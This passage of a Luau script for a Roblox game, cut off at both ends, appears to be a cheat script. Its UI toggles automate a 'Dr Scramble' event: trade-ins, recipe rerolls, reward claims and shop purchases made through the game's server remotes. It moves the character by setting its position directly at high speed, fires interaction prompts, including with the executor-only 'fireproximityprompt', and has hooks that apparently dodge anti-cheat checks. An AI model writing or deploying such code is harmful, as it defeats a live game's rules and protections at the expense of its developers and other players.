				table.sort(reqCandidates, function(a, b)
					if a.Mutated ~= b.Mutated then
						return b.Mutated
					end
					return a.Scale < b.Scale
				end)
			end

			local tradeInUids = {}
			local usedUids = {}

			for _, requirement in ipairs(requirements) do
				local reqCandidates = candidatesByReq[tostring(requirement)]
				local ipairsFn = ipairs
				reqCandidates = reqCandidates or {}
				local selectedCandidate = nil

				for _, candidate in ipairsFn(reqCandidates) do
					if not usedUids[candidate.Uid] then
						selectedCandidate = candidate
						break
					else
						selectedCandidate = nil
					end
				end

				if not selectedCandidate then
					return nil, "Missing " .. getEggDisplayName(requirement)
				end
				usedUids[selectedCandidate.Uid] = true
				table.insert(tradeInUids, selectedCandidate.Uid)
			end

			return tradeInUids
		end

		local function getLabStatusString()
			local state = labStateCache
			if type(state) ~= "table" then
				return "Lab status unknown"
			end

			if state.Unlocked ~= true then
				return "Lab is locked on this account"
			end
			local reqNames = {}
			local ipairsFn = ipairs
			local requirements = state.Requirements or {}

			for _, requirement in ipairsFn(requirements) do
				table.insert(reqNames, getEggDisplayName(requirement))
			end

			local timeRemaining = (tonumber(state.SecondsUntilRotation) or 0) - os.clock() - labCheckTime

			if timeRemaining < 0 then
				timeRemaining = 0
			end

			local statusStr = string.format("%s  -  needs %s  -  pity %s/%s  -  free rerolls %s  -  rotates in %d:%02d", tostring(state.BannerDisplayName or state.BannerId or "Lab"), #reqNames > 0 and table.concat(reqNames, ", ") or "unknown", tostring(state.PityCount or 0), tostring(state.PityThreshold or 0), tostring(state.FreeRefreshesRemaining or 0), math.floor(timeRemaining / 60), math.floor(timeRemaining % 60))

			if labStatusText ~= "" then
				statusStr ..= "  -  " .. labStatusText
			end

			return statusStr
		end

		local function executeTradeIn(stamp)
			local state = getLabState(true)
			if type(state) ~= "table" or state.Unlocked ~= true then
				return
			end

			if state.PendingReward ~= nil and state.PendingReward ~= false then
				local claimOk, claimRes = invokeLabRemote("RF/ScrambleTradeIn/AskFinishReveal")
				labStatusText = claimOk and claimRes ~= false and "Reward claimed" or "Reward claim failed"
				nextLabCheck = 0
				return
			end

			local saveData = getLabSaveData()
			if not saveData then
				return
			end
			local tradeInBatch, errorStr = getTradeInBatch(state, saveData)

			if not tradeInBatch then
				labStatusText = errorStr or "Recipe not ready"
				local shouldReroll = stamp == tradeInActionStamp and chilliState.Toggle(autoRerollHandle, false)

				if shouldReroll then
					shouldReroll = (tonumber(state.FreeRefreshesRemaining) or 0) > 0
				end

				if shouldReroll then
					local rerollOk, rerollRes, rerollMsg = invokeLabRemote("RF/ScrambleTradeIn/AskRefresh")

					if rerollOk and rerollRes ~= false then
						labStatusText = "Recipe rerolled"
					else
						labStatusText = tostring(rerollMsg or "Reroll rejected")
					end

					nextLabCheck = 0
				end

				return
			end

			if not chilliState.Toggle(autoTradeInHandle, false) then
				labStatusText = "Ready to trade in"
				return
			end

			if stamp ~= tradeInActionStamp then
				return
			end
			local tradeOk, tradeRes, tradeMsg = invokeLabRemote("RF/ScrambleTradeIn/AskTradeIn", tradeInBatch)

			if tradeOk and tradeRes ~= false then
				labStatusText = "Trade-in sent"
			else
				labStatusText = tostring(tradeMsg or "Trade rejected")
			end

			nextLabCheck = 0
		end

		local labStatusTextLabel = scrambleSection:CreateText({ Name = "Lab Status", Text = "Loading Lab data..." })

		autoTradeInHandle = scrambleSection:CreateToggle({
			Name = "Auto Lab Trade-In",
			Default = false,
			Callback = function()
				tradeInActionStamp += 1
				labStatusText = ""
				nextTradeInAction = 0
				nextLabCheck = 0
				taskScheduler.Wake()
			end,
		})

		autoRerollHandle = scrambleSection:CreateToggle({
			Name = "Auto Reroll Lab Recipe",
			Default = false,
			Callback = function()
				tradeInActionStamp += 1
				labStatusText = ""
				nextTradeInAction = 0
				nextLabCheck = 0
				taskScheduler.Wake()
			end,
		})

		for _, item in ipairs({
			{ Key = "Place", Name = "Place Lab Recipe Eggs" },
			{ Key = "Hatch", Name = "Hatch Lab Recipe Eggs" },
		}) do
			local key = item.Key

			chilliState.Rift.Handles[key] = scrambleSection:CreateToggle({
				Name = item.Name,
				Default = false,
				Callback = function()
					chilliState.Rift.Next = 0
					local restartFn = chilliState.Rift.Restart[key]

					if type(restartFn) == "function" then
						restartFn()
					end

					taskScheduler.Wake()
				end,
			})
		end

		taskScheduler.Add(function()
			local isTradeInEnabled = chilliState.Toggle(autoTradeInHandle, false)
			local isRerollEnabled = chilliState.Toggle(autoRerollHandle, false)
			local checkInterval = (isTradeInEnabled or isRerollEnabled) and 5 or 30

			if not isLabUIUpdateRunning and (labStateCache == nil or nextLabCheck == 0 or os.clock() - labCheckTime >= checkInterval) then
				isLabUIUpdateRunning = true

				task.spawn(function()
					pcall(getLabState, true)
					isLabUIUpdateRunning = false
				end)
			end

			if labStatusTextLabel and type(labStatusTextLabel.Set) == "function" then
				pcall(labStatusTextLabel.Set, labStatusTextLabel, getLabStatusString())
			end

			local shouldSkipTrade = isTradeInRunning

			if not isTradeInRunning then
				shouldSkipTrade = not (isTradeInEnabled or isRerollEnabled)
			end

			if shouldSkipTrade or os.clock() < nextTradeInAction then
				return false
			end
			isTradeInRunning = true
			nextTradeInAction = os.clock() + labActionCooldown
			local currentStamp = tradeInActionStamp

			task.spawn(function()
				pcall(executeTradeIn, currentStamp)
				isTradeInRunning = false
				taskScheduler.Wake()
			end)

			return false
		end)
	end

	local scrambleActionCooldown = 6
	local scrambleCheckCooldown = 1.5
	local scrambleTravelSpeed = 400
	local scrambleLostParts, scrambleRewards, scrambleWantedRewards, scrambleClaimedParts, scrambleActionStamp, scrambleSnapshot, scrambleSnapshotTime, scrambleIsRunning, scrambleNextAction, scrambleNextCheck, scrambleSamplesReserve
	local getScramblePartsStatus, scrambleDroneCooldowns, scrambleTeleportCooldown, scrambleTeleportInterval, isBuyingScrambled, isScrambleTaskRunning
	local scrambleStatusStr, scramblePhaseStr, scrambleEquipState, scrambleHitboxRadius, scrambleInvisState, scrambleSwapState, scrambleHoldState, scrambleHasStarted, scrambleTrySpawn, scramblePartTarget
	local invokeScramble, refreshScrambleSnapshot, getScrambleState, isScrambleEventActive, isScrambleWindowActive, hasCollectedScramblePart, getCollectedPartsCount, getScrambleStatusText, getRootPart, scrambleWalkTo
	local firePrompt, getCaveTeleporterPrompt, getPromptPosition, isInScrambleCave, isInsideScrambleCave, isPositionInBase, isInsideBase, leaveScrambleBase, scrambleMoveTo, scrambleReturnToSafeZone, enterScrambleCave, discoverScrambleEvent
	local collectLostParts, openScrambleVault, getScrambleShopPurchases, buyScrambleShopItems, fn29, fn30, fn31
	local fn9, fn10, fn11, fn12, fn13, fn14, fn15, fn16, fn17, fn18, fn19, fn20, fn21, fn22, fn23, fn24, fn25, fn26, fn27, fn28

	do
		local scrambleEventCenter = Vector3.new(2120, -120, -355)
		scrambleSamplesReserve = 0
		scrambleLostParts = { "LostPart1", "LostPart2" }
		scrambleDroneCooldowns = {}
		scrambleTeleportCooldown = 0
		scrambleTeleportInterval = 1
		isBuyingScrambled = false
		isScrambleTaskRunning = false

		scrambleRewards = {
			{ Label = "Experiment #001", Id = "LimitedTimeExperimentPet" },
			{ Label = "Nibbles #013", Id = "Nibbles013" },
			{ Label = "Scrambled Mutation", Id = "MutationConsumable" },
			{ Label = "2x Cash Booster", Id = "CashBooster" },
			{ Label = "1.25x Speed", Id = "SpeedBoost" },
			{ Label = "2x Treadmill Booster", Id = "TreadmillBooster" },
		}

		local scrambleRewardLabels = {}

		for _, rewardInfo in ipairs(scrambleRewards) do
			scrambleRewardLabels[#scrambleRewardLabels + 1] = rewardInfo.Label
		end

		scrambleWantedRewards = {}
		scrambleClaimedParts = {}
		scrambleActionStamp = 0
		local validTargetMap = { ["Experiment #001"] = true, ["Nibbles #013"] = true, ["Scrambled Mutation"] = true }
		scrambleSnapshot = nil
		scrambleSnapshotTime = -math.huge
		scrambleIsRunning = false
		scrambleNextAction = 0
		scrambleNextCheck = 0
		scrambleStatusStr = ""
		scramblePhaseStr = ""
		scrambleEquipState = { Tool = nil, EquipAt = 0 }
		scrambleHitboxRadius = 16
		scrambleInvisState = false
		scrambleSwapState = { Index = 1, Since = 0, Tool = nil }
		scrambleHoldState = { Latch = false, Ended = false }
		scrambleHasStarted = false
		scrambleTrySpawn = 0
		scramblePartTarget = nil

		local function getScrambleRemote()
			local packages = ReplicatedStorage:FindFirstChild("Packages")
			packages = packages and packages:FindFirstChild("Networking")
			packages = packages and packages:FindFirstChild("RF/Scramble/Request")
			if packages and packages:IsA("RemoteFunction") then
				return packages
			end
			return nil
		end

		invokeScramble = function(action, ...)
			local scrambleRemote = getScrambleRemote()
			if not scrambleRemote then
				return nil
			end
			local args = table.pack(...)

			local ok, result = pcall(function()
				return scrambleRemote:InvokeServer(action, table.unpack(args, 1, args.n))
			end)

			if not ok or type(result) ~= "table" then
				return nil
			end

			if type(result.Snapshot) == "table" then
				scrambleSnapshot = result.Snapshot
				scrambleSnapshotTime = os.clock()
			elseif action == "Snapshot" and type(result.State) == "table" then
				scrambleSnapshot = result
				scrambleSnapshotTime = os.clock()
			end

			return result
		end

		refreshScrambleSnapshot = function(forceUpdate)
			if forceUpdate or scrambleSnapshot == nil or os.clock() - scrambleSnapshotTime >= scrambleActionCooldown then
				invokeScramble("Snapshot")
			end

			return scrambleSnapshot
		end
		fn9 = refreshScrambleSnapshot

		getScrambleState = function()
			local snapshot = scrambleSnapshot
			return type(snapshot) == "table" and type(snapshot.State) == "table" and snapshot.State or nil
		end
		fn10 = getScrambleState

		isScrambleEventActive = function()
			local snapshot = scrambleSnapshot
			if type(snapshot) ~= "table" or snapshot.Enabled == false or type(snapshot.State) ~= "table" then
				return false
			end
			local eventEndsAt = tonumber(snapshot.EventEndsAt)
			return eventEndsAt == nil or workspace:GetServerTimeNow() < eventEndsAt
		end
		fn11 = isScrambleEventActive

		isScrambleWindowActive = function()
			local snapshot = scrambleSnapshot
			local outbreakWindow = type(snapshot) == "table" and snapshot.Window or nil
			if type(outbreakWindow) ~= "table" then
				return false, nil
			end
			local serverTimeNow = workspace:GetServerTimeNow()
			local startsAt = tonumber(outbreakWindow.StartsAt)
			local endsAt = tonumber(outbreakWindow.EndsAt)
			local isActive = outbreakWindow.Active == true
			local isNowActive

			if isActive then
				isNowActive = isActive
			else
				isNowActive = startsAt and endsAt and serverTimeNow >= startsAt and serverTimeNow < endsAt
			end

			if isNowActive then
				return true, endsAt and math.max(0, endsAt - serverTimeNow) or nil
			end
			local nextAt = tonumber(outbreakWindow.NextAt)
			return false, nextAt and math.max(0, nextAt - serverTimeNow) or nil
		end
		fn12 = isScrambleWindowActive

		hasCollectedScramblePart = function(stateObj, partName)
			local lostParts = type(stateObj) == "table" and stateObj.LostParts or nil
			if type(lostParts) ~= "table" then
				return false
			end

			if lostParts[partName] then
				return true
			end

			for _, lostPart in pairs(lostParts) do
				if lostPart == partName then
					return true
				end
			end

			return false
		end
		fn13 = hasCollectedScramblePart

		getCollectedPartsCount = function(stateObj)
			local count = 0

			for _, lostPart in ipairs(scrambleLostParts) do
				if hasCollectedScramblePart(stateObj, lostPart) then
					count += 1
				end
			end

			return count
		end
		fn14 = getCollectedPartsCount

		local function formatScrambleTime(seconds)
			local rounded = math.max(0, math.floor(tonumber(seconds) or 0))
			if rounded >= 3600 then
				return string.format("%dh %dm", rounded // 3600, rounded % 3600 // 60)
			end
			return string.format("%dm %ds", rounded // 60, rounded % 60)
		end

		getScrambleStatusText = function()
			local stateObj = getScrambleState()
			if not stateObj then
				return "Dr Scramble event is not running"
			end

			if not isScrambleEventActive() then
				return "Dr Scramble event has ended"
			end
			local isOutbreakLive, outbreakTime = isScrambleWindowActive()
			local statusStr

			if isOutbreakLive then
				statusStr = "Outbreak live " .. formatScrambleTime(outbreakTime or 0)
			else
				statusStr = isOutbreakLive
			end

			statusStr = statusStr or outbreakTime and "Outbreak in " .. formatScrambleTime(outbreakTime) or "Outbreak soon"
			local vaultStatus = stateObj.Completed == true and "Vault claimed"

			if not vaultStatus then
				vaultStatus = string.format("Lost %d/2  Drone %d/3", getCollectedPartsCount(stateObj), math.min(3, tonumber(stateObj.DroneParts) or 0))
			end

			if isOutbreakLive then
				local droneCount = 0

				for _, droneData in pairs(scrambleWantedRewards) do
					if (tonumber(droneData.Health) or 0) > 0 then
						droneCount += 1
					end
				end

				statusStr ..= string.format("  %d drones", droneCount)
			end

			local finalStatus = string.format("Samples %d  -  %s  -  %s", tonumber(stateObj.Samples) or 0, vaultStatus, statusStr)

			if scramblePhaseStr ~= "" and chilliState.Toggle(nil, false) then
				finalStatus ..= "  -  " .. scramblePhaseStr
			end

			if scrambleStatusStr ~= "" then
				finalStatus ..= "  -  " .. scrambleStatusStr
			end

			return finalStatus
		end
		fn15 = getScrambleStatusText

		getRootPart = function()
			return chilliState.Root()
		end
		fn16 = getRootPart

		scrambleWalkTo = function(targetPos, isCancelledFn, tolerance, speed)
			local walkSpeed = speed or 400
			local rootPart = getRootPart()
			if not rootPart then
				return false
			end
			tolerance = tolerance or 1
			if (rootPart.Position - targetPos).Magnitude <= tolerance then
				return true
			end
			chilliState.Shield("scramble", true)
			local timeout = os.clock() + 6

			while not chilliState.Swapped() and os.clock() < timeout and not isCancelledFn() do
				scrambleStatusStr = "Waiting for the character to settle"
				RunService.Heartbeat:Wait()
			end

			local currentRoot = getRootPart() or rootPart
			local character = localPlayer.Character
			chilliState.Driving = chilliState.Driving + 1
			local position = currentRoot.Position
			local walkComplete = nil
			local maxDuration = (targetPos - position).Magnitude / walkSpeed + 3
			local walkTimer = 0

			local connection = RunService.Heartbeat:Connect(function(deltaTime)
				if walkComplete ~= nil or chilliState.AntiGuard.Busy then
					return
				end
				walkTimer += deltaTime
				local latestRoot = getRootPart()
				if not latestRoot or isCancelledFn() or walkTimer > maxDuration or localPlayer.Character ~= character then
					walkComplete = false
					return
				end

				if (latestRoot.Position - position).Magnitude > 8 then
					position = latestRoot.Position
				end

				local offset = targetPos - position
				local stepMove = walkSpeed * deltaTime
				local isDone = offset.Magnitude <= math.max(stepMove, tolerance)
				position = isDone and targetPos or position + offset.Unit * stepMove
				local lookVector = Vector3.new(offset.X, 0, offset.Z)
				local cframe = lookVector.Magnitude > 0.05 and CFrame.lookAt(Vector3.zero, lookVector.Unit) or latestRoot.CFrame.Rotation

				pcall(function()
					latestRoot.CFrame = CFrame.new(position) * cframe
					latestRoot.AssemblyLinearVelocity = Vector3.zero
					latestRoot.AssemblyAngularVelocity = Vector3.zero
				end)

				if isDone then
					walkComplete = true
				end
			end)

			while walkComplete == nil do
				RunService.Heartbeat:Wait()
			end

			connection:Disconnect()
			chilliState.Driving = math.max(0, chilliState.Driving - 1)
			chilliState.Shield("scramble", false)
			return walkComplete
		end
		fn17 = scrambleWalkTo

		firePrompt = function(prompt)
			if typeof(prompt) ~= "Instance" or not prompt:IsA("ProximityPrompt") then
				return false
			end

			local ok = pcall(function()
				prompt:InputHoldBegin()
				local holdTime = tonumber(type(chilliState.PromptHold) == "function" and chilliState.PromptHold(prompt) or prompt.HoldDuration) or 0

				if holdTime > 0 then
					task.wait(holdTime + 0.2)
				end

				prompt:InputHoldEnd()
			end)

			if not ok and type(fireproximityprompt) == "function" then
				ok = pcall(fireproximityprompt, prompt)
			end

			return ok
		end
		fn18 = firePrompt

		local function getCaveSecretZone()
			local world = workspace:FindFirstChild("World") or workspace:FindFirstChild("__OBJECTS")
			local secretZones = world and world:FindFirstChild("SecretZones")
			return secretZones and secretZones:FindFirstChild("Cave") or nil
		end

		getCaveTeleporterPrompt = function(name)
			local caveZone = getCaveSecretZone()
			local teleporter = caveZone and caveZone:FindFirstChild("Teleporter")
			teleporter = teleporter and teleporter:FindFirstChild(name)
			teleporter = teleporter and teleporter:FindFirstChild("SecretZonePrompt", true)
			return teleporter and teleporter:IsA("ProximityPrompt") and teleporter or nil
		end
		fn19 = getCaveTeleporterPrompt

		getPromptPosition = function(prompt, fallbackPos)
			local parent = prompt and prompt.Parent
			if parent and parent:IsA("Attachment") then
				return parent.WorldPosition
			end

			if parent and parent:IsA("BasePart") then
				return parent.Position
			end
			return fallbackPos
		end
		fn20 = getPromptPosition

		isInScrambleCave = function()
			local rootPart = getRootPart()
			if not rootPart then
				return false
			end
			local position = rootPart.Position
			local offset2D = Vector3.new(position.X - scrambleEventCenter.X, 0, position.Z - scrambleEventCenter.Z)
			return position.Y < -60 and offset2D.Magnitude < 160
		end
		isInsideScrambleCave = isInScrambleCave
		fn21 = isInScrambleCave

		local function getSeparationLineX()
			local world = workspace:FindFirstChild("World") or workspace:FindFirstChild("__OBJECTS")
			world = world and world:FindFirstChild("Areas")
			world = world and world:FindFirstChild("SeparationLine")
			return world and world:IsA("BasePart") and world.Position.X or 552
		end

		isPositionInBase = function(pos)
			if not pos then
				local rootPart = getRootPart()
				pos = rootPart and rootPart.Position
			end

			return pos ~= nil and pos.X < getSeparationLineX()
		end
		isInsideBase = isPositionInBase
		fn22 = isPositionInBase

		local onCharAddedScramble = localPlayer.CharacterAdded:Connect(function()
			chilliState.ScrambleRespawned = true
			scrambleEquipState.Tool = nil
			scrambleEquipState.EquipAt = 0
		end)

		trackCleanup(function()
			pcall(function()
				onCharAddedScramble:Disconnect()
			end)
		end)

		leaveScrambleBase = function(isCancelledFn, targetPos)
			if not isPositionInBase() then
				chilliState.ScrambleRespawned = false
				return true
			end

			if targetPos and isPositionInBase(targetPos) then
				return true
			end

			local function waitInBase()
				scrambleStatusStr = "Respawned, resting in the safe zone"
				local waitTimeout = os.clock() + 0.75

				while os.clock() < waitTimeout do
					if isCancelledFn() then
						return false
					end
				task.wait(0.1)
				end

				chilliState.ScrambleRespawned = false
				return true
			end

			local homePos = type(chilliState.StealHome) == "function" and chilliState.StealHome() or nil
			if not homePos then
				chilliState.ScrambleRespawned = false
				return true
			end
			local isRespawned = chilliState.ScrambleRespawned == true

			if chilliState.DistanceTo(homePos) <= 12 then
				if isRespawned then
					return (waitInBase())
				end
				return true
			end

			scrambleStatusStr = isRespawned and "Respawned, easing out through the safe zone" or "Leaving the base through the safe zone"
			local walkComplete = scrambleWalkTo(homePos + Vector3.new(0, 3, 0), isCancelledFn, 3, isRespawned and math.min(400, 300) or nil)
			if walkComplete and isRespawned then
				return (waitInBase())
			end
			return walkComplete
		end
		fn23 = leaveScrambleBase
		local walkToCavePortal = leaveScrambleBase

		local function scrambleFlyTo(targetPos, isCancelledFn, tolerance)
			local rootPart = getRootPart()
			if not rootPart then
				return false
			end
			chilliState.Shield("scramblefly", true)
			local position = rootPart.Position
			local flyComplete = true

			if Vector3.new(targetPos.X - position.X, 0, targetPos.Z - position.Z).Magnitude > 250 then
				local safeY = math.max(position.Y, targetPos.Y, 98)
				flyComplete = scrambleWalkTo(Vector3.new(position.X, safeY, position.Z), isCancelledFn, 2) and scrambleWalkTo(Vector3.new(targetPos.X, safeY, targetPos.Z), isCancelledFn, 2)
			end

			flyComplete = flyComplete and scrambleWalkTo(targetPos, isCancelledFn, math.min(tolerance, 2))
			chilliState.Shield("scramblefly", false)
			return flyComplete
		end

		local function getScrambleSafeZoneExit()
			local homePos = type(chilliState.StealHome) == "function" and chilliState.StealHome() or nil
			return homePos and homePos + Vector3.new(0, 3, 0) or nil
		end

		scrambleMoveTo = function(targetPos, isCancelledFn, tolerance)
			tolerance = tolerance or 6
			if chilliState.DistanceTo(targetPos) <= tolerance then
				return true
			end
			local isInBaseNow = isPositionInBase()
			local isTargetInBase = isPositionInBase(targetPos)

			if isInBaseNow and not isTargetInBase then
				if not leaveScrambleBase(isCancelledFn, targetPos) then
					return false
			end
			elseif isTargetInBase and not isInBaseNow then
				local safeZoneExit = getScrambleSafeZoneExit()

				if safeZoneExit and (safeZoneExit - targetPos).Magnitude > 12 and chilliState.DistanceTo(safeZoneExit) > 12 then
					scrambleStatusStr = "Coming back through the safe zone"
					if not scrambleFlyTo(safeZoneExit, isCancelledFn, 3) then
						return false
					end
				end
			end

			return scrambleFlyTo(targetPos, isCancelledFn, tolerance)
		end
		fn24 = scrambleMoveTo

		scrambleReturnToSafeZone = function(isCancelledFn)
			if isPositionInBase() or isCancelledFn() or chilliState.IsNight() or chilliState.WallSealed() then
				return
			end
			local safeZoneExit = getScrambleSafeZoneExit()

			if safeZoneExit then
				scrambleStatusStr = "Coming back through the safe zone"
				scrambleMoveTo(safeZoneExit, isCancelledFn, 4)
			end
		end
		fn25 = scrambleReturnToSafeZone

		enterScrambleCave = function(isCancelledFn)
			if isInScrambleCave() then
				return true
			end
			local entryPrompt = getCaveTeleporterPrompt("Entry")
			local entryPos = getPromptPosition(entryPrompt, Vector3.new(2125.7, 73.1, -295.4))
			scrambleStatusStr = "Flying to the Secret Cave"
			if not scrambleMoveTo(entryPos, isCancelledFn, 6) then
				return false
			end

			for i = 1, 4 do
				if isCancelledFn() then
					return false
				end
				scrambleStatusStr = "Entering the Secret Cave"
				firePrompt(entryPrompt or getCaveTeleporterPrompt("Entry"))
				local timeout = os.clock() + 1.5

				while os.clock() < timeout and not isInScrambleCave() do
					RunService.Heartbeat:Wait()
				end

				if isInScrambleCave() then
					return true
				end
			end

			scrambleStatusStr = "Cave door missed, flying in"
			local questObj = type(scrambleSnapshot) == "table" and scrambleSnapshot.Quest or nil
			local fallbackPos = type(questObj) == "table" and type(questObj.EscapedExperiment) == "table" and questObj.EscapedExperiment.Position or nil

			if typeof(fallbackPos) == "Vector3" then
				pcall(chilliState.FlyTo, fallbackPos, isCancelledFn, "scramble")
			end

			return isInScrambleCave()
		end

		local function getScrambleQuestPosition(name)
			local questObj = type(scrambleSnapshot) == "table" and scrambleSnapshot.Quest or nil
			local questTarget = type(questObj) == "table" and questObj[name] or nil
			local position = type(questTarget) == "table" and questTarget.Position or nil
			if typeof(position) == "Vector3" then
				return position
			end
			local drScrambleEvent = workspace:FindFirstChild("DrScrambleEvent")
			drScrambleEvent = drScrambleEvent and drScrambleEvent:FindFirstChild(name)
			if drScrambleEvent and drScrambleEvent:IsA("Model") then
				return drScrambleEvent:GetPivot().Position
			end
			return nil
		end

		local function getScrambleInteractionRadius(name)
			local snapshot = scrambleSnapshot
			local interactions = type(snapshot) == "table" and snapshot.Interactions or nil
			return math.max(4, (type(interactions) == "table" and tonumber(interactions[name]) or 12) - 4)
		end

		discoverScrambleEvent = function(isCancelledFn)
			local stateObj = getScrambleState()
			if not stateObj or stateObj.Discovered == true then
				return true
			end
			local escapedExperimentPos = getScrambleQuestPosition("EscapedExperiment")
			if not escapedExperimentPos or not enterScrambleCave(isCancelledFn) then
				return false
			end
			scrambleStatusStr = "Talking to the Escaped Experiment"
			if not scrambleWalkTo(escapedExperimentPos, isCancelledFn, getScrambleInteractionRadius("NpcRadius")) then
				return false
			end
			local discoverRes = invokeScramble("Discover")
			refreshScrambleSnapshot(true)
			return discoverRes ~= nil and getScrambleState() ~= nil and getScrambleState().Discovered == true
		end
		fn26 = discoverScrambleEvent

		collectLostParts = function(isCancelledFn)
			local stateObj = getScrambleState()
			local hasPartsOrDone = not stateObj or stateObj.Completed == true
			local hasAllParts

			if hasPartsOrDone then
				hasAllParts = hasPartsOrDone
			else
				local maxParts = #scrambleLostParts
				hasAllParts = getCollectedPartsCount(stateObj) >= maxParts
			end

			if hasAllParts then
				return
			end

			if stateObj.Discovered ~= true and not discoverScrambleEvent(isCancelledFn) then
				return
			end

			for _, lostPartName in ipairs(scrambleLostParts) do
				if isCancelledFn() then
					return
				end

				if not hasCollectedScramblePart(getScrambleState(), lostPartName) then
					local drScrambleEvent = workspace:FindFirstChild("DrScrambleEvent")
					local hitbox = drScrambleEvent and drScrambleEvent:FindFirstChild(lostPartName)
					hitbox = hitbox and hitbox:FindFirstChild("Hitbox", true)
					local claimLostPart = hitbox and hitbox:FindFirstChild("ClaimLostPart", true)
					local targetPos = hitbox and hitbox:IsA("BasePart") and hitbox.Position or getScrambleQuestPosition(lostPartName)

					if targetPos then
						scrambleStatusStr = "Flying to " .. (lostPartName == "LostPart1" and "Lost Part 1" or "Lost Part 2")

						if scrambleMoveTo(targetPos + Vector3.new(0, 2, 0), isCancelledFn, 3) then
							scrambleStatusStr = "Collecting the lost part"
							local holdPos = targetPos + Vector3.new(0, 2.5, 0)
							local character = localPlayer.Character
							chilliState.Shield("scramble", true)
							chilliState.Driving = chilliState.Driving + 1

							local collectConnection = RunService.Heartbeat:Connect(function()
								local rootPart = chilliState.Root()
								if not rootPart or rootPart.Parent ~= character or chilliState.AntiGuard.Busy or chilliState.Movement.Owner ~= "scramble" then
									return
								end

								pcall(function()
									local rotation = rootPart.CFrame.Rotation
									rootPart.CFrame = CFrame.new(holdPos) * rotation
									rootPart.AssemblyLinearVelocity = Vector3.zero
									rootPart.AssemblyAngularVelocity = Vector3.zero
								end)
							end)

							for attempt = 1, 4 do
								if not isCancelledFn() then
									claimLostPart = claimLostPart or hitbox and hitbox:FindFirstChild("ClaimLostPart", true)
									firePrompt(claimLostPart)
									task.wait(0.6)
									refreshScrambleSnapshot(true)
									if not hasCollectedScramblePart(getScrambleState(), lostPartName) then
										continue
									end
								end

								break
							end

							collectConnection:Disconnect()
							chilliState.Driving = math.max(0, chilliState.Driving - 1)
							chilliState.Shield("scramble", false)
							if isCancelledFn() then
								return
							end
							continue
						end
					end
				end
			end
		end
		fn27 = collectLostParts

		openScrambleVault = function(isCancelledFn)
			local stateObj = getScrambleState()
			if not stateObj or stateObj.Completed == true then
				return
			end
			local totalPartsCollected = tonumber(stateObj.TotalParts)

			if not totalPartsCollected then
				totalPartsCollected = getCollectedPartsCount(stateObj) + (tonumber(stateObj.DroneParts) or 0)
			end

			if totalPartsCollected < 5 then
				return
			end
			local experimentVaultPos = getScrambleQuestPosition("ExperimentVault")
			if not experimentVaultPos or not enterScrambleCave(isCancelledFn) then
				return
			end
			scrambleStatusStr = "Opening the Experiment Vault"
			if not scrambleWalkTo(experimentVaultPos, isCancelledFn, getScrambleInteractionRadius("VaultRadius")) then
				return
			end
			invokeScramble("Vault")
			refreshScrambleSnapshot(true)
			local newStateObj = getScrambleState()

			if newStateObj and newStateObj.Completed == true then
				scrambleStatusStr = "Vault opened, The Scrambler unlocked"
			end
		end
		fn28 = openScrambleVault

		local function findScrambledMutationTool()
			local function isScrambledMutationTool(item)
				if not item or not item:IsA("Tool") then
					return false
				end

				if tostring(item:GetAttribute("ItemType")) ~= "MutationConsumable" then
					return false
				end
				local mutationId = item:GetAttribute("MutationId") or item:GetAttribute("MutationTemplate")
				if mutationId ~= nil then
					return tostring(mutationId) == "Scrambled"
				end
				return string.find(string.lower(item.Name), "scrambled", 1, true) ~= nil
			end

			local character = localPlayer.Character

			if character then
				for _, child in ipairs(character:GetChildren()) do
					if isScrambledMutationTool(child) then
						return child, true
					end
				end
			end

			local backpack = localPlayer:FindFirstChildOfClass("Backpack")

			if backpack then
				for _, child in ipairs(backpack:GetChildren()) do
					if isScrambledMutationTool(child) then
						return child, false
					end
				end
			end

			return nil, false
		end

		getScrambleShopPurchases = function(stateObj, itemInfo)
			local shopPurchases = type(stateObj) == "table" and stateObj.ShopPurchases or nil
			local purchaseRecord = type(shopPurchases) == "table" and shopPurchases[itemInfo.Id] or nil
			if type(purchaseRecord) ~= "table" then
				return 0
			end
			local shopPeriod = type(scrambleSnapshot) == "table" and scrambleSnapshot.ShopPeriod or nil
			if purchaseRecord.Period ~= nil and shopPeriod ~= nil and purchaseRecord.Period ~= shopPeriod then
				return 0
			end
			return tonumber(purchaseRecord.Count) or 0
		end
		fn30 = getScrambleShopPurchases

		buyScrambleShopItems = function(isCancelledFn)
			local latestSnapshot = refreshScrambleSnapshot(true)
			if type(latestSnapshot) ~= "table" or type(latestSnapshot.Shop) ~= "table" then
				return
			end

			for _, itemInfo in ipairs(scrambleRewards) do
				if isCancelledFn() then
					return
				end

				if validTargetMap[itemInfo.Label] == true then
					for i = 1, 10 do
						local currentSnapshot = scrambleSnapshot
						local stateObj = getScrambleState()
						local ipairsIter, shopTable, startIndex = ipairs(type(currentSnapshot) == "table" and currentSnapshot.Shop or {})
						local shopItemInfo = nil

						for _, shopItem in ipairsIter, shopTable, startIndex do
							if type(shopItem) == "table" and shopItem.Id == itemInfo.Id then
								shopItemInfo = shopItem
							end
						end

						if not (not shopItemInfo or not stateObj or isCancelledFn()) then
							local purchaseLimit = tonumber(shopItemInfo.PurchaseLimit)

							if not (purchaseLimit and getScrambleShopPurchases(stateObj, shopItemInfo) >= purchaseLimit) then
								if not ((tonumber(stateObj.Samples) or 0) - (tonumber(shopItemInfo.Price) or math.huge) < scrambleSamplesReserve) then
									local buyResult = invokeScramble("Shop", shopItemInfo.Id, { Quote = shopItemInfo.Quote, Sequence = tonumber(stateObj.ShopSequence) or 0 })

									if not (type(buyResult) ~= "table" or buyResult.Ok ~= true) then
										scrambleStatusStr = "Bought " .. itemInfo.Label
										task.wait(0.4)
										continue
									end
								end
							end
						end

						break
					end
				end
			end
		end
		fn31 = buyScrambleShopItems
		getScrambleClaimState = buyScrambleShopItems

		fn21 = isInScrambleCave
		fn25 = scrambleReturnToSafeZone
		fn26 = discoverScrambleEvent
		fn27 = collectLostParts
		fn28 = openScrambleVault
		fn30 = getScrambleShopPurchases
		fn31 = buyScrambleShopItems
	end

	local scrambleHitboxRadius, scrambleWeaponRadius, scrambleTargetDist, scramblePatrolPoints, scrambleDrones, scrambleTravelMode, scrambleTweenSpeed, scrambleAttackDelay, scrambleMoveStop, scrambleLostPartTarget
	local isScrambleDroneHuntActive, isScrambleCollectLostPartsActive, runScrambleAutomationLoop
	local fn32, fn34, fn35, fn36


	do
		local maxHatchDistance = 98
		local scrambleHitboxRadius = 12
		local scrambleWeaponRadius = 20
		local scrambleTargetDist = 3

		local scramblePatrolPoints = {
			Vector3.new(2000, 90, -360),
